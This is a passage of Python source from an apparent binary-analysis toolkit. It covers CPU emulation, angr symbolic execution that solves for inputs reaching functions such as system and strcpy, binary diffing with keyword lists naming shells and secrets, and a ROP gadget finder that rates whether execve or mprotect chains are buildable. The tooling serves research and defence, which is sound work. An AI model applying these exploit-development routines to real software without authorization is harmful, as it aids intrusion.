            func_address: Start address of function
            args: Function arguments (placed in appropriate registers/stack)
        
        Returns:
            EmulationTrace with results
        """
        if not self.uc:
            return EmulationTrace(
                start_address=func_address, end_address=0, instructions_executed=0,
                states=[], memory_accesses=[], syscalls=[], api_calls=[],
                decoded_strings=[], loops_detected=[], suspicious_behaviors=[],
                error="Emulator not available"
            )
        
        args = args or []
        
        # Set up arguments based on calling convention
        if self.is_64bit:
            # System V AMD64 ABI
            arg_regs = [UC_X86_REG_RDI, UC_X86_REG_RSI, UC_X86_REG_RDX, 
                       UC_X86_REG_RCX, UC_X86_REG_R8, UC_X86_REG_R9]
            for i, arg in enumerate(args[:6]):
                self.uc.reg_write(arg_regs[i], arg)
        else:
            # cdecl - push args on stack (reverse order)
            esp = self.uc.reg_read(UC_X86_REG_ESP)
            for arg in reversed(args):
                esp -= 4
                self.uc.mem_write(esp, arg.to_bytes(4, 'little'))
            self.uc.reg_write(UC_X86_REG_ESP, esp)
        
        return self.emulate(func_address, timeout_ms=3000)


def emulate_binary(file_path: Path, metadata: BinaryMetadata,
                   target_addresses: List[int] = None) -> EmulationResult:
    """
    Perform emulation analysis of a binary.
    
    Args:
        file_path: Path to binary file
        metadata: Binary metadata
        target_addresses: Specific addresses to emulate (default: entry point)
    
    Returns:
        EmulationResult with all traces and findings
    """
    if not UNICORN_AVAILABLE:
        return EmulationResult(
            traces=[],
            decoded_strings=[],
            api_calls=[],
            syscalls=[],
            self_modifying_code=[],
            anti_analysis_detected=["Unicorn not available"]
        )
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        architecture = metadata.architecture
        
        # Determine base address
        base_address = metadata.entry_point or 0x400000
        if base_address > 0x10000:
            base_address = (base_address // 0x1000) * 0x1000  # Page align
        else:
            base_address = 0x400000
        
        # Create emulator
        emulator = BinaryEmulator(architecture, data, base_address)
        
        if not emulator.uc:
            return EmulationResult(
                traces=[],
                decoded_strings=[],
                api_calls=[],
                syscalls=[],
                self_modifying_code=[],
                anti_analysis_detected=[f"Emulation not supported for {architecture}"]
            )
        
        traces = []
        all_strings = []
        all_suspicious = []
        
        # Determine addresses to emulate
        addresses = target_addresses or []
        if not addresses and metadata.entry_point:
            addresses.append(metadata.entry_point)
        
        # Also try to emulate suspicious functions if we have them
        if not addresses:
            # Just emulate from start of data
            addresses.append(base_address)
        
        for addr in addresses[:5]:  # Limit to 5 traces
            trace = emulator.emulate(addr, timeout_ms=5000)
            traces.append(trace)
            all_strings.extend(trace.decoded_strings)
            all_suspicious.extend(trace.suspicious_behaviors)
        
        # Detect self-modifying code across all traces
        smc = []
        for trace in traces:
            for access in trace.memory_accesses:
                if access.access_type == "write":
                    if base_address <= access.address < base_address + len(data):
                        smc.append({
                            "address": access.address,
                            "size": access.size,
                            "trace_start": trace.start_address
                        })
        
        total_instructions = sum(t.instructions_executed for t in traces)
        
        return EmulationResult(
            traces=traces,
            decoded_strings=all_strings,
            api_calls=[],
            syscalls=[],
            self_modifying_code=smc[:50],
            shellcode_detected=len(all_strings) > 0 and any('cmd' in s.decoded_value.lower() or 'shell' in s.decoded_value.lower() for s in all_strings),
            anti_analysis_detected=list(set(all_suspicious)),
            total_instructions_emulated=total_instructions,
            emulation_coverage=min(100.0, total_instructions / 100)
        )
        
    except Exception as e:
        logger.error(f"Emulation failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return EmulationResult(
            traces=[],
            decoded_strings=[],
            api_calls=[],
            syscalls=[],
            self_modifying_code=[],
            anti_analysis_detected=[f"Emulation error: {str(e)}"]
        )


# ============================================================================
# Symbolic Execution (angr-based)
# ============================================================================

def perform_symbolic_execution(file_path: Path, 
                               target_addresses: List[int] = None,
                               max_time_seconds: int = 120,
                               max_paths: int = 1000) -> SymbolicExecutionResult:
    """
    Perform symbolic execution to discover inputs that trigger vulnerabilities.
    
    Uses angr for path exploration and constraint solving to:
    - Find inputs that reach dangerous functions
    - Discover crash-inducing inputs
    - Identify buffer overflow conditions
    
    Args:
        file_path: Path to the binary
        target_addresses: Specific addresses to try to reach
        max_time_seconds: Maximum execution time
        max_paths: Maximum number of paths to explore
    
    Returns:
        SymbolicExecutionResult with discovered paths and vulnerabilities
    """
    if not ANGR_AVAILABLE:
        return SymbolicExecutionResult(
            paths_explored=0, paths_deadended=0, paths_errored=0,
            max_depth_reached=0, symbolic_inputs=[], crash_inputs=[],
            target_reaches=[], interesting_paths=[], vulnerabilities_found=[],
            execution_time_seconds=0, memory_used_mb=0,
            error="angr not installed"
        )
    
    import time
    import psutil
    start_time = time.time()
    start_memory = psutil.Process().memory_info().rss / (1024 * 1024)
    
    try:
        # Load the binary
        proj = angr.Project(str(file_path), auto_load_libs=False)
        
        # Create initial state with symbolic stdin
        state = proj.factory.entry_state(
            stdin=angr.SimFile('/dev/stdin', content=claripy.BVS('stdin', 256 * 8)),
            add_options={
                angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
                angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
            }
        )
        
        # Create simulation manager
        simgr = proj.factory.simulation_manager(state)
        
        # Define dangerous functions to target
        dangerous_functions = [
            'system', 'execve', 'execl', 'popen', 'strcpy', 'strcat', 
            'sprintf', 'gets', 'scanf', 'memcpy', 'memmove'
        ]
        
        # Find addresses of dangerous functions
        target_addrs = target_addresses or []
        dangerous_addrs = {}
        
        for func_name in dangerous_functions:
            try:
                sym = proj.loader.find_symbol(func_name)
                if sym:
                    target_addrs.append(sym.rebased_addr)
                    dangerous_addrs[sym.rebased_addr] = func_name
            except:
                pass
        
        # Explore with timeout
        crash_inputs = []
        target_reaches = []
        interesting_paths = []
        vulnerabilities = []
        
        # Custom exploration technique with limits
        paths_explored = 0
        max_depth = 0
        
        while simgr.active and paths_explored < max_paths:
            if time.time() - start_time > max_time_seconds:
                break
            
            simgr.step()
            paths_explored += 1
            
            # Track depth
            for state in simgr.active:
                depth = len(state.history.bbl_addrs.hardcopy)
                max_depth = max(max_depth, depth)
            
            # Check if we reached any targets
            for state in list(simgr.active):
                current_addr = state.addr
                if current_addr in dangerous_addrs:
                    func_name = dangerous_addrs[current_addr]
                    
                    # Try to solve for concrete input
                    try:
                        stdin_content = state.posix.stdin.content[0][0]
                        concrete = state.solver.eval(stdin_content, cast_to=bytes)
                        
                        target_reaches.append(TargetReach(
                            target_address=current_addr,
                            target_name=func_name,
                            reached=True,
                            input_to_reach=concrete[:256],
                            path_length=len(state.history.bbl_addrs.hardcopy),
                            constraints_solved=len(state.solver.constraints)
                        ))
                        
                        # Check for potential vulnerabilities
                        if func_name in ('strcpy', 'strcat', 'gets', 'sprintf'):
                            vulnerabilities.append({
                                "type": "buffer_overflow",
                                "function": func_name,
                                "address": current_addr,
                                "cwe": "CWE-120",
                                "input_sample": concrete[:64].hex(),
                                "description": f"Input reaches {func_name} which can cause buffer overflow"
                            })
                        elif func_name in ('system', 'execve', 'popen'):
                            vulnerabilities.append({
                                "type": "command_injection", 
                                "function": func_name,
                                "address": current_addr,
                                "cwe": "CWE-78",
                                "input_sample": concrete[:64].hex(),
                                "description": f"Input reaches {func_name} - potential command injection"
                            })
                    except Exception as e:
                        logger.debug(f"Could not solve for input at {func_name}: {e}")
            
            # Check for crashed/errored states
            if hasattr(simgr, 'errored'):
                for errored in simgr.errored:
                    state = errored.state
                    try:
                        stdin_content = state.posix.stdin.content[0][0]
                        concrete = state.solver.eval(stdin_content, cast_to=bytes)
                        
                        crash_inputs.append(CrashInput(
                            input_type='stdin',
                            input_value=concrete[:256],
                            crash_address=state.addr,
                            crash_type=str(errored.error)[:50],
                            vulnerability_type='crash',
                            exploitability='unknown'
                        ))
                    except:
                        pass
        
        # Build interesting paths from deadended states
        for state in simgr.deadended[:20]:
            path_addrs = list(state.history.bbl_addrs.hardcopy)[:100]
            branches = [(addr, True) for addr in path_addrs[:20]]  # Simplified
            
            interesting_paths.append(SymbolicPath(
                path_id=len(interesting_paths),
                depth=len(path_addrs),
                constraints_count=len(state.solver.constraints),
                is_feasible=True,
                termination_reason='deadended',
                addresses_visited=path_addrs,
                branches_taken=branches
            ))
        
        # Build symbolic inputs summary
        symbolic_inputs = [
            SymbolicInput(
                name='stdin',
                type='stdin',
                size_bits=256 * 8,
                constraints=[str(c)[:100] for c in state.solver.constraints[:5]] if simgr.deadended else [],
                concrete_examples=[tr.input_to_reach.hex()[:64] for tr in target_reaches[:3] if tr.input_to_reach]
            )
        ]
        
        end_time = time.time()
        end_memory = psutil.Process().memory_info().rss / (1024 * 1024)
        
        return SymbolicExecutionResult(
            paths_explored=paths_explored,
            paths_deadended=len(simgr.deadended) if hasattr(simgr, 'deadended') else 0,
            paths_errored=len(simgr.errored) if hasattr(simgr, 'errored') else 0,
            max_depth_reached=max_depth,
            symbolic_inputs=symbolic_inputs,
            crash_inputs=crash_inputs[:20],
            target_reaches=target_reaches[:20],
            interesting_paths=interesting_paths[:20],
            vulnerabilities_found=vulnerabilities,
            execution_time_seconds=round(end_time - start_time, 2),
            memory_used_mb=round(end_memory - start_memory, 2),
            timeout_reached=time.time() - start_time >= max_time_seconds
        )
        
    except Exception as e:
        logger.error(f"Symbolic execution failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return SymbolicExecutionResult(
            paths_explored=0, paths_deadended=0, paths_errored=0,
            max_depth_reached=0, symbolic_inputs=[], crash_inputs=[],
            target_reaches=[], interesting_paths=[], vulnerabilities_found=[],
            execution_time_seconds=time.time() - start_time, memory_used_mb=0,
            error=str(e)
        )


# ============================================================================
# Binary Diffing
# ============================================================================

def diff_binaries(file_path_a: Path, file_path_b: Path,
                  detailed: bool = True) -> BinaryDiffResult:
    """
    Compare two binaries to identify changes (patches, modifications).
    
    Useful for:
    - Patch analysis (what changed in a security update?)
    - Malware variant comparison
    - Backdoor detection
    
    Args:
        file_path_a: Path to first binary (original/older)
        file_path_b: Path to second binary (patched/newer)
        detailed: Include detailed block-level diffs
    
    Returns:
        BinaryDiffResult with all differences
    """
    try:
        with open(file_path_a, 'rb') as f:
            data_a = f.read()
        with open(file_path_b, 'rb') as f:
            data_b = f.read()
        
        # Quick check: are they identical?
        if data_a == data_b:
            return BinaryDiffResult(
                file_a=str(file_path_a),
                file_b=str(file_path_b),
                architecture_a="unknown",
                architecture_b="unknown",
                functions_identical=0,
                functions_modified=0,
                functions_added=0,
                functions_removed=0,
                overall_similarity=1.0,
                function_diffs=[],
                block_diffs=[],
                string_diffs=[],
                import_diffs=[],
                security_relevant_changes=[],
                patch_analysis="Files are identical",
                is_same_binary=True
            )
        
        # Parse both binaries
        metadata_a = _parse_binary_metadata(data_a, file_path_a)
        metadata_b = _parse_binary_metadata(data_b, file_path_b)
        
        arch_a = metadata_a.architecture if metadata_a else "unknown"
        arch_b = metadata_b.architecture if metadata_b else "unknown"
        
        # Extract and compare functions using Capstone
        functions_a = _extract_functions_for_diff(data_a, metadata_a)
        functions_b = _extract_functions_for_diff(data_b, metadata_b)
        
        # Build name-based matching
        funcs_by_name_a = {f['name']: f for f in functions_a}
        funcs_by_name_b = {f['name']: f for f in functions_b}
        
        function_diffs = []
        block_diffs = []
        
        identical = 0
        modified = 0
        added = 0
        removed = 0
        security_changes = []
        
        # Security-relevant function patterns
        security_funcs = {'check', 'verify', 'auth', 'login', 'password', 'crypt', 
                          'valid', 'secure', 'sign', 'hash', 'key', 'token', 'cert'}
        
        # Compare functions that exist in both
        all_names = set(funcs_by_name_a.keys()) | set(funcs_by_name_b.keys())
        
        for name in all_names:
            func_a = funcs_by_name_a.get(name)
            func_b = funcs_by_name_b.get(name)
            
            is_security_relevant = any(s in name.lower() for s in security_funcs)
            
            if func_a and func_b:
                # Function exists in both - compare
                similarity = _compute_function_similarity(func_a, func_b)
                
                if similarity >= 0.99:
                    identical += 1
                    match_type = 'identical'
                else:
                    modified += 1
                    match_type = 'modified'
                    
                    if is_security_relevant:
                        security_changes.append({
                            "type": "security_function_modified",
                            "function": name,
                            "similarity": similarity,
                            "description": f"Security-related function '{name}' was modified"
                        })
                
                function_diffs.append(FunctionDiff(
                    address_a=func_a['address'],
                    address_b=func_b['address'],
                    name=name,
                    match_type=match_type,
                    similarity_score=similarity,
                    size_a=func_a['size'],
                    size_b=func_b['size'],
                    instructions_changed=abs(func_a['instruction_count'] - func_b['instruction_count']),
                    blocks_changed=0,
                    calls_added=[],
                    calls_removed=[],
                    is_security_relevant=is_security_relevant
                ))
                
            elif func_a and not func_b:
                # Function removed
                removed += 1
                function_diffs.append(FunctionDiff(
                    address_a=func_a['address'],
                    address_b=None,
                    name=name,
                    match_type='removed',
                    similarity_score=0.0,
                    size_a=func_a['size'],
                    size_b=None,
                    instructions_changed=func_a['instruction_count'],
                    blocks_changed=0,
                    calls_added=[],
                    calls_removed=[],
                    is_security_relevant=is_security_relevant
                ))
                
                if is_security_relevant:
                    security_changes.append({
                        "type": "security_function_removed",
                        "function": name,
                        "description": f"Security function '{name}' was removed - potential backdoor?"
                    })
                    
            else:
                # Function added
                added += 1
                function_diffs.append(FunctionDiff(
                    address_a=0,
                    address_b=func_b['address'],
                    name=name,
                    match_type='added',
                    similarity_score=0.0,
                    size_a=0,
                    size_b=func_b['size'],
                    instructions_changed=func_b['instruction_count'],
                    blocks_changed=0,
                    calls_added=[],
                    calls_removed=[],
                    is_security_relevant=is_security_relevant
                ))
                
                if is_security_relevant:
                    security_changes.append({
                        "type": "security_function_added",
                        "function": name,
                        "description": f"New security function '{name}' added"
                    })
        
        # Compare strings
        strings_a = set(s.value for s in extract_strings(data_a, min_length=6, max_strings=5000))
        strings_b = set(s.value for s in extract_strings(data_b, min_length=6, max_strings=5000))
        
        string_diffs = []
        security_string_patterns = ['http', 'password', 'key', 'token', 'secret', 'admin', 
                                    'root', 'shell', '/bin/', 'cmd.exe', 'powershell']
        
        for s in strings_a - strings_b:
            is_security = any(p in s.lower() for p in security_string_patterns)
            string_diffs.append(StringDiff(
                value=s[:200],
                status='removed',
                address_a=0,
                address_b=None,
                is_security_relevant=is_security
            ))
            if is_security:
                security_changes.append({
                    "type": "security_string_removed",
                    "value": s[:100],
                    "description": "Security-relevant string was removed"
                })
        
        for s in strings_b - strings_a:
            is_security = any(p in s.lower() for p in security_string_patterns)
            string_diffs.append(StringDiff(
                value=s[:200],
                status='added',
                address_a=None,
                address_b=0,
                is_security_relevant=is_security
            ))
            if is_security:
                security_changes.append({
                    "type": "security_string_added",
                    "value": s[:100],
                    "description": "New security-relevant string added"
                })
        
        # Compare imports
        imports_a = {imp.name for imp in analyze_imports(data_a, metadata_a)}
        imports_b = {imp.name for imp in analyze_imports(data_b, metadata_b)}
        
        import_diffs = []
        dangerous_imports = {'system', 'execve', 'popen', 'eval', 'LoadLibrary', 
                            'GetProcAddress', 'VirtualAlloc', 'CreateRemoteThread'}
        
        for imp in imports_a - imports_b:
            is_security = imp.lower() in dangerous_imports
            import_diffs.append(ImportDiff(name=imp, library='', status='removed', 
                                           is_security_relevant=is_security))
        
        for imp in imports_b - imports_a:
            is_security = imp.lower() in dangerous_imports
            import_diffs.append(ImportDiff(name=imp, library='', status='added',
                                           is_security_relevant=is_security))
            if is_security:
                security_changes.append({
                    "type": "dangerous_import_added",
                    "import": imp,
                    "description": f"Potentially dangerous import '{imp}' was added"
                })
        
        # Calculate overall similarity
        total_funcs = max(len(functions_a), len(functions_b), 1)
        overall_sim = identical / total_funcs if total_funcs > 0 else 0.0
        
        # Generate patch analysis summary
        patch_summary = _generate_patch_summary(
            identical, modified, added, removed,
            string_diffs, import_diffs, security_changes
        )
        
        return BinaryDiffResult(
            file_a=str(file_path_a),
            file_b=str(file_path_b),
            architecture_a=arch_a,
            architecture_b=arch_b,
            functions_identical=identical,
            functions_modified=modified,
            functions_added=added,
            functions_removed=removed,
            overall_similarity=round(overall_sim, 4),
            function_diffs=function_diffs[:100],
            block_diffs=block_diffs[:50],
            string_diffs=string_diffs[:100],
            import_diffs=import_diffs[:50],
            security_relevant_changes=security_changes[:30],
            patch_analysis=patch_summary,
            is_same_binary=False
        )
        
    except Exception as e:
        logger.error(f"Binary diffing failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return BinaryDiffResult(
            file_a=str(file_path_a),
            file_b=str(file_path_b),
            architecture_a="unknown",
            architecture_b="unknown",
            functions_identical=0,
            functions_modified=0,
            functions_added=0,
            functions_removed=0,
            overall_similarity=0.0,
            function_diffs=[],
            block_diffs=[],
            string_diffs=[],
            import_diffs=[],
            security_relevant_changes=[],
            patch_analysis=None,
            is_same_binary=False,
            error=str(e)
        )


def _parse_binary_metadata(data: bytes, file_path: Path) -> Optional[BinaryMetadata]:
    """Helper to parse binary metadata for diffing."""
    if data[:2] == b'MZ':
        return parse_pe_header(data)
    elif data[:4] == b'\x7fELF':
        return parse_elf_header(data)
    return None


def _extract_functions_for_diff(data: bytes, metadata: Optional[BinaryMetadata]) -> List[Dict]:
    """Extract function info for diffing."""
    functions = []
    
    if not CAPSTONE_AVAILABLE or not metadata:
        return functions
    
    try:
        architecture = metadata.architecture or 'x86_64'
        
        # Set up Capstone
        if 'x86_64' in architecture or 'AMD64' in architecture:
            md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
        elif 'x86' in architecture or 'i386' in architecture:
            md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
        else:
            return functions
        
        md.detail = True
        
        # Simple function detection: look for function prologues
        func_prologues = [
            b'\x55\x48\x89\xe5',  # push rbp; mov rbp, rsp (x64)
            b'\x55\x89\xe5',      # push ebp; mov ebp, esp (x86)
        ]
        
        for prologue in func_prologues:
            offset = 0
            while True:
                idx = data.find(prologue, offset)
                if idx == -1:
                    break
                
                # Disassemble to find function end
                func_code = data[idx:idx+500]
                instructions = list(md.disasm(func_code, idx))
                
                if instructions:
                    # Find ret instruction
                    size = 0
                    instr_count = 0
                    for instr in instructions:
                        size += instr.size
                        instr_count += 1
                        if instr.mnemonic in ('ret', 'retn'):
                            break
                    
                    functions.append({
                        'name': f'sub_{idx:x}',
                        'address': idx,
                        'size': size,
                        'instruction_count': instr_count,
                        'bytes': data[idx:idx+size].hex()[:100]
                    })
                
                offset = idx + 1
                
                if len(functions) >= 200:
                    break
            
            if len(functions) >= 200:
                break
        
    except Exception as e:
        logger.debug(f"Function extraction failed: {e}")
    
    return functions


def _compute_function_similarity(func_a: Dict, func_b: Dict) -> float:
    """Compute similarity between two functions."""
    # Simple similarity based on size and instruction count
    size_sim = 1.0 - abs(func_a['size'] - func_b['size']) / max(func_a['size'], func_b['size'], 1)
    instr_sim = 1.0 - abs(func_a['instruction_count'] - func_b['instruction_count']) / max(func_a['instruction_count'], func_b['instruction_count'], 1)
    
    # If we have byte sequences, compare them
    bytes_sim = 0.5
    if func_a.get('bytes') and func_b.get('bytes'):
        # Simple LCS-style comparison
        common = sum(1 for a, b in zip(func_a['bytes'], func_b['bytes']) if a == b)
        bytes_sim = common / max(len(func_a['bytes']), len(func_b['bytes']), 1)
    
    return (size_sim + instr_sim + bytes_sim) / 3.0


def _generate_patch_summary(identical: int, modified: int, added: int, removed: int,
                           string_diffs: List, import_diffs: List, 
                           security_changes: List) -> str:
    """Generate a human-readable patch summary."""
    lines = []
    
    total = identical + modified + added + removed
    if total == 0:
        return "Unable to analyze functions"
    
    lines.append(f"Function Changes: {modified} modified, {added} added, {removed} removed (of {total} total)")
    
    if string_diffs:
        added_strings = len([s for s in string_diffs if s.status == 'added'])
        removed_strings = len([s for s in string_diffs if s.status == 'removed'])
        lines.append(f"String Changes: {added_strings} added, {removed_strings} removed")
    
    if import_diffs:
        added_imports = len([i for i in import_diffs if i.status == 'added'])
        removed_imports = len([i for i in import_diffs if i.status == 'removed'])
        lines.append(f"Import Changes: {added_imports} added, {removed_imports} removed")
    
    if security_changes:
        lines.append(f" Security-Relevant Changes: {len(security_changes)}")
        for change in security_changes[:5]:
            lines.append(f"  - {change['type']}: {change.get('description', '')[:80]}")
    
    return "\n".join(lines)


# ============================================================================
# ROP Gadget Finder
# ============================================================================

def find_rop_gadgets(file_path: Path, 
                     max_gadgets: int = 500,
                     max_gadget_length: int = 6) -> ROPGadgetResult:
    """
    Find ROP gadgets in a binary for exploit development.
    
    ROP (Return-Oriented Programming) gadgets are small instruction sequences
    ending in 'ret' that can be chained together to bypass NX protection.
    
    Args:
        file_path: Path to the binary
        max_gadgets: Maximum number of gadgets to return
        max_gadget_length: Maximum instructions per gadget
    
    Returns:
        ROPGadgetResult with all discovered gadgets
    """
    if ROPPER_AVAILABLE:
        return _find_gadgets_with_ropper(file_path, max_gadgets, max_gadget_length)
    else:
        # Fall back to manual gadget finding with Capstone
        return _find_gadgets_with_capstone(file_path, max_gadgets, max_gadget_length)


def _find_gadgets_with_ropper(file_path: Path, max_gadgets: int, 
                               max_gadget_length: int) -> ROPGadgetResult:
    """Use ropper library for comprehensive gadget finding."""
    try:
        rs = RopperService()
        rs.addFile(str(file_path))
        rs.options.inst_count = max_gadget_length
        
        rs.loadGadgetsFor()
        
        gadgets = []
        pop_gadgets = []
        syscall_gadgets = []
        write_gadgets = []
        pivot_gadgets = []
        gadgets_by_type = {}
        
        for gadget in rs.getFileFor(name=str(file_path)).gadgets:
            if len(gadgets) >= max_gadgets:
                break
            
            # Parse gadget
            gadget_str = str(gadget)
            instructions = gadget_str.split('; ')
            address = gadget.address
            
            # Classify gadget
            gadget_type = _classify_gadget(instructions)
            gadgets_by_type[gadget_type] = gadgets_by_type.get(gadget_type, 0) + 1
            
            # Check which registers are controlled
            regs_controlled = _get_controlled_registers(instructions)
            
            # Calculate quality score
            quality = _calculate_gadget_quality(instructions)
            
            rop_gadget = ROPGadget(
                address=address,
                instructions=instructions,
                gadget_string=gadget_str,
                gadget_type=gadget_type,
                size_bytes=len(instructions) * 3,  # Rough estimate
                registers_controlled=regs_controlled,
                is_useful=quality > 0.5,
                quality_score=quality
            )
            
            gadgets.append(rop_gadget)
            
            # Categorize
            if gadget_type == 'pop':
                pop_gadgets.append(rop_gadget)
            elif gadget_type == 'syscall':
                syscall_gadgets.append(rop_gadget)
            elif gadget_type == 'write':
                write_gadgets.append(rop_gadget)
            elif gadget_type == 'pivot':
                pivot_gadgets.append(rop_gadget)
        
        rs.removeFile(str(file_path))
        
        # Build chain templates
        chain_templates = _build_chain_templates(
            pop_gadgets, syscall_gadgets, write_gadgets, pivot_gadgets
        )
        
        # Assess exploitability
        has_syscall = len(syscall_gadgets) > 0
        has_pop_rdi = any('rdi' in g.registers_controlled for g in pop_gadgets)
        has_pop_rsi = any('rsi' in g.registers_controlled for g in pop_gadgets)
        has_pop_rax = any('rax' in g.registers_controlled for g in pop_gadgets)
        
        execve_buildable = has_syscall and has_pop_rdi and has_pop_rsi and has_pop_rax
        mprotect_buildable = has_syscall and has_pop_rdi and has_pop_rsi
        
        # Determine difficulty
        if execve_buildable and len(gadgets) > 100:
            difficulty = 'easy'
        elif mprotect_buildable or len(gadgets) > 50:
            difficulty = 'medium'
        elif len(gadgets) > 20:
            difficulty = 'hard'
        else:
            difficulty = 'very_hard'
        
        useful_gadgets = sorted([g for g in gadgets if g.is_useful], 
                               key=lambda x: -x.quality_score)[:100]
        
        return ROPGadgetResult(
            total_gadgets=len(gadgets),
            unique_gadgets=len(set(g.gadget_string for g in gadgets)),
            gadgets_by_type=gadgets_by_type,
            gadgets=gadgets[:max_gadgets],
            useful_gadgets=useful_gadgets,
            pop_gadgets=pop_gadgets[:50],
            syscall_gadgets=syscall_gadgets[:20],
            write_gadgets=write_gadgets[:30],
            pivot_gadgets=pivot_gadgets[:20],
            chain_templates=chain_templates,
            nx_bypass_possible=len(gadgets) > 10,
            execve_chain_buildable=execve_buildable,
            mprotect_chain_buildable=mprotect_buildable,
            rop_difficulty=difficulty
        )
        
    except Exception as e:
        logger.error(f"Ropper gadget finding failed: {e}")
        return _find_gadgets_with_capstone(file_path, max_gadgets, max_gadget_length)


def _find_gadgets_with_capstone(file_path: Path, max_gadgets: int,
                                max_gadget_length: int) -> ROPGadgetResult:
    """Manual gadget finding using Capstone (fallback)."""
    if not CAPSTONE_AVAILABLE:
        return ROPGadgetResult(
            total_gadgets=0, unique_gadgets=0, gadgets_by_type={},
            gadgets=[], useful_gadgets=[], pop_gadgets=[], syscall_gadgets=[],
            write_gadgets=[], pivot_gadgets=[], chain_templates=[],
            nx_bypass_possible=False, execve_chain_buildable=False,
            mprotect_chain_buildable=False, rop_difficulty='very_hard',
            error="Neither ropper nor capstone available"
        )
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Determine architecture
        if data[:4] == b'\x7fELF':
            is_64bit = data[4] == 2
        elif data[:2] == b'MZ':
            # PE - check machine type at offset 0x3C + 4
            pe_offset = int.from_bytes(data[0x3C:0x40], 'little')
            machine = int.from_bytes(data[pe_offset+4:pe_offset+6], 'little')
            is_64bit = machine == 0x8664
        else:
            is_64bit = True  # Default to 64-bit
        
        if is_64bit:
            md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
        else:
            md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
        
        md.detail = True
        
        gadgets = []
        pop_gadgets = []
        syscall_gadgets = []
        write_gadgets = []
        pivot_gadgets = []
        gadgets_by_type = {}
        
        # Find all 'ret' instructions and search backwards
        ret_opcodes = [b'\xc3', b'\xc2']  # ret, ret imm16
        
        found_addresses = set()
        
        for ret_opcode in ret_opcodes:
            offset = 0
            while len(gadgets) < max_gadgets:
                idx = data.find(ret_opcode, offset)
                if idx == -1:
                    break
                
                # Search backwards for gadgets
                for back in range(1, max_gadget_length * 15 + 1):
                    if idx - back < 0:
                        break
                    
                    gadget_bytes = data[idx - back:idx + len(ret_opcode)]
                    
                    try:
                        instructions = list(md.disasm(gadget_bytes, idx - back))
                        
                        # Valid gadget if it ends with ret
                        if instructions and instructions[-1].mnemonic in ('ret', 'retn'):
                            # Check if all bytes were disassembled
                            total_size = sum(i.size for i in instructions)
                            if total_size == len(gadget_bytes) and len(instructions) <= max_gadget_length:
                                addr = idx - back
                                
                                if addr in found_addresses:
                                    continue
                                found_addresses.add(addr)
                                
                                instr_strs = [f"{i.mnemonic} {i.op_str}".strip() for i in instructions]
                                gadget_str = '; '.join(instr_strs)
                                
                                gadget_type = _classify_gadget(instr_strs)
                                gadgets_by_type[gadget_type] = gadgets_by_type.get(gadget_type, 0) + 1
                                
                                regs = _get_controlled_registers(instr_strs)
                                quality = _calculate_gadget_quality(instr_strs)
                                
                                rop_gadget = ROPGadget(
                                    address=addr,
                                    instructions=instr_strs,
                                    gadget_string=gadget_str,
                                    gadget_type=gadget_type,
                                    size_bytes=total_size,
                                    registers_controlled=regs,
                                    is_useful=quality > 0.5,
                                    quality_score=quality
                                )
                                
                                gadgets.append(rop_gadget)
                                
                                if gadget_type == 'pop':
                                    pop_gadgets.append(rop_gadget)
                                elif gadget_type == 'syscall':
                                    syscall_gadgets.append(rop_gadget)
                                elif gadget_type == 'write':
                                    write_gadgets.append(rop_gadget)
                                elif gadget_type == 'pivot':
                                    pivot_gadgets.append(rop_gadget)
                    except:
                        pass
                
                offset = idx + 1
        
        # Also find syscall/int 0x80 gadgets
        syscall_patterns = [b'\x0f\x05', b'\xcd\x80']  # syscall, int 0x80
        for pattern in syscall_patterns:
            offset = 0
            while True:
                idx = data.find(pattern, offset)
                if idx == -1:
                    break
                
                if idx not in found_addresses:
                    found_addresses.add(idx)
                    gadget_str = 'syscall' if pattern == b'\x0f\x05' else 'int 0x80'
                    rop_gadget = ROPGadget(
                        address=idx,
                        instructions=[gadget_str],
                        gadget_string=gadget_str,
                        gadget_type='syscall',
                        size_bytes=len(pattern),
                        registers_controlled=[],
                        is_useful=True,
                        quality_score=1.0
                    )
                    gadgets.append(rop_gadget)
                    syscall_gadgets.append(rop_gadget)
                
                offset = idx + 1
        
        # Build chain templates
        chain_templates = _build_chain_templates(
            pop_gadgets, syscall_gadgets, write_gadgets, pivot_gadgets
        )
        
        # Assess exploitability
        has_syscall = len(syscall_gadgets) > 0
        has_pop_rdi = any('rdi' in g.registers_controlled for g in pop_gadgets)
        has_pop_rsi = any('rsi' in g.registers_controlled for g in pop_gadgets)
        has_pop_rax = any('rax' in g.registers_controlled for g in pop_gadgets)
        
        execve_buildable = has_syscall and has_pop_rdi and has_pop_rsi and has_pop_rax
        mprotect_buildable = has_syscall and has_pop_rdi and has_pop_rsi
        
        if execve_buildable and len(gadgets) > 100:
            difficulty = 'easy'
        elif mprotect_buildable or len(gadgets) > 50:
            difficulty = 'medium'
        elif len(gadgets) > 20:
            difficulty = 'hard'
        else:
            difficulty = 'very_hard'
        
        useful_gadgets = sorted([g for g in gadgets if g.is_useful],
                               key=lambda x: -x.quality_score)[:100]
        
        return ROPGadgetResult(
            total_gadgets=len(gadgets),
            unique_gadgets=len(set(g.gadget_string for g in gadgets)),
            gadgets_by_type=gadgets_by_type,
            gadgets=gadgets[:max_gadgets],
            useful_gadgets=useful_gadgets,
            pop_gadgets=pop_gadgets[:50],
            syscall_gadgets=syscall_gadgets[:20],
            write_gadgets=write_gadgets[:30],
            pivot_gadgets=pivot_gadgets[:20],
            chain_templates=chain_templates,
            nx_bypass_possible=len(gadgets) > 10,
            execve_chain_buildable=execve_buildable,
            mprotect_chain_buildable=mprotect_buildable,
            rop_difficulty=difficulty
        )
        
    except Exception as e:
        logger.error(f"Capstone gadget finding failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return ROPGadgetResult(
            total_gadgets=0, unique_gadgets=0, gadgets_by_type={},
            gadgets=[], useful_gadgets=[], pop_gadgets=[], syscall_gadgets=[],
            write_gadgets=[], pivot_gadgets=[], chain_templates=[],
            nx_bypass_possible=False, execve_chain_buildable=False,
